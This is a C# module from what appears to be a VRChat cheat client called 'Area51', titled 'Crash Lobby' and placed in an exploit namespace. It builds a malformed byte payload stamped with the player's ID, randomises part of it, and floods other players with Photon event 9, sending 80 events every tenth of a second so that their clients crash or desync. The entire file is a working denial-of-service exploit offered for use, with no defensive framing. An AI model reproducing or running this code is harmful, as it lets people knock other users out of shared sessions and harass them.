using Area51.SDK.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using System;
using System.Collections;
using UnityEngine;

namespace Area51.Module.Exploit
{
    internal class Event9V2 : BaseModule
    {
        public Event9V2() : base("Event9V2", "Crash Lobby", Main.Instance.Eventexploitbutton, null, true) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(Desync());
        }

        IEnumerator Desync()
        {
            byte[] LagData1 = new byte[] {
                   65, 13, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 26, 1, 99, 0, 0, 0, 63, 98, 40, 62, 99, 99, 99, 99, 99, 81, 21, 55, 255, 69, 255, 31, 75, 0, 0, 0, 243, 0, 0, 0, 112, 180, 171, 190, 128, 225, 163, 187, 247, 139, 21, 65, 255, 255, 255, 31, 75, 0, 0, 0, 195, 0, 8, 32, 145, 0, 11, 30, 1, 6, 5, 4, 0, 28, 8, 0, 7, 11, 128, 3, 0, 231, 70, 16, 23, 51, 255, 216, 201, 51, 53, 98, 149, 111, 127, 153, 0, 51, 122, 76, 89, 0, 45, 95, 100, 0, 0, 71, 43, 180, 57, 33, 52, 250, 33, 55, 32, 255, 66, 6, 242, 56, 6, 37, 158, 255, 181, 177, 228, 41, 91, 175, 12, 41, 251, 38, 173, 172, 82, 160, 6, 38, 90, 187, 173, 50, 26, 46, 137, 56, 6, 178, 124, 180, 101, 59, 22, 47, 77, 170, 239, 48, 88, 146, 44, 52, 235, 55, 64, 56, 55, 55, 255, 172, 221, 49, 151, 27, 252, 151, 39, 176, 155, 49, 232, 180, 105, 52, 11, 181, 174, 180, 65, 35, 36, 175, 19, 59, 230, 44, 223, 180, 103, 184, 166, 52, 10, 50, 85, 53, 138, 48, 210, 45, 118, 0,85, 53, 138, 48, 210, 45, 118, 185
                };
            int idfirst2 = int.Parse(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId + "00001");
            byte[] IDOut2 = BitConverter.GetBytes(idfirst2);
            Buffer.BlockCopy(IDOut2, 0, LagData1, 0, 4);
            System.Random rng = new System.Random();
            while (this.toggled)
            {
                for (int i = 0; i < 80; i++)
                {
                    LagData1[rng.Next(50, 60)] = (byte)rng.Next(0, 100);
                    LagData1[rng.Next(50, 60)] = (byte)rng.Next(0, 100);
                    LagData1[rng.Next(50, 60)] = (byte)rng.Next(0, 100);
                    LagData1[rng.Next(50, 60)] = (byte)rng.Next(0, 100);
                    PhotonExtensions.OpRaiseEvent(9, LagData1, new Photon.Realtime.RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others,
                        field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache
                    }, SendOptions.SendReliable);
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }
    }
}
